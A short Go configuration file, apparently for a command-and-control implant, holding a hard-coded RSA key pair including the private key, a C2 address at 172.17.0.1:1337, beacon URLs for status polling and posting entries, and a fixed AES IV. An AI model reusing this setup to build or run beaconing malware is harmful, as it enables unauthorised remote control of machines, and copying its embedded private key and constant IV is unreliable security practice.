package config

import (
	"time"
)

var (
	RsaPublicKey = []byte(`
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCMjY7xK7D3ld50Un8XnxwW1KXJ4Q1S2IC2wQJE
yS81UilZ5XZND8F8MzPB+i97zFkThLSwL7Or4HfzXbLWUoLCylo7rLTTCkJAW+lbU80PScBEhhPR
jHk3J+0kIIwhN2GaJaO37cn8vi77qRF5q6jMDw2rbNQu8DCFI342+jX0cwIDAQAB
-----END PUBLIC KEY-----
	`)
	RsaPrivateKey = []byte(`
-----BEGIN PRIVATE KEY-----
MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIyNjvErsPeV3nRSfxefHBbUpcnh
DVLYgLbBAkTJLzVSKVnldk0PwXwzM8H6L3vMWROEtLAvs6vgd/NdstZSgsLKWjustNMKQkBb6VtT
zQ9JwESGE9GMeTcn7SQgjCE3YZolo7ftyfy+LvupEXmrqMwPDats1C7wMIUjfjb6NfRzAgMBAAEC
gYAVB6nkwuqfzjrygP9xe4XlPUcFwu3OlgStk4kb3VWkxEOEpwqBiEMlKrdqpYeiSIE8JDsxhh77
hMKzKrNd/GAtESEHXcH3cr4TmwmvHUAsOacvUbmTGfwoqitjL71vLNEtT2OQ21adV0YPR5fVVUpe
fYf+tSbZS5FEV62vijGyOQJBAO8Iah4Ee5XE247yEc6JFCDNV7dj2IJH3J4TwK27PqUvqISF5juh
n+7MJqOy1P71XsTCxwc7OpXy9Jawi6xUjNkCQQCWh53IxJzUJRdSMM9On//32lZfffypqzMMLGqj
O3/J/Uqm9pvck+n6OK1Ads6gC/ugr18WOOiX8UqTgxtCFSwrAkAt62HnblkHho/fQCWnlbHmM0x8
kJPRQ1jgjU7gkS4Rsbwf6VE3d28wAswRepNsf1q7VefCPeCdWdUe9b9/VabRAkBOx70pRNT7JkpV
RpxIfu5czhUkNvCT77hwp5JLyajwkrKOPUSHJZZv0VfDBCrRklPn3cB7Bd+dHbg1CYmrhR8vAkEA
6NEfb3J4ufaUAEFmFwZRRzOhMxTxV+F20OIwH2CjzHeMqh5mthh7iT9nXLvLJ6X4FDga6JjwwhSc
DTS1IIqMpg==
-----END PRIVATE KEY-----
	`)


	C2        = "172.17.0.1:1337"
	plainHTTP = "http://"
	sslHTTP   = "https://"
	GetUrl    = plainHTTP + C2 + "/api/v1/status"
	PostUrl   = plainHTTP + C2 + "/api/v1/entry?id="
	WaitTime  = 10000 * time.Millisecond
	VerifySSLCert = true
	TimeOut time.Duration  = 10 //seconds

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
)

const (
	DebugMode = true
)
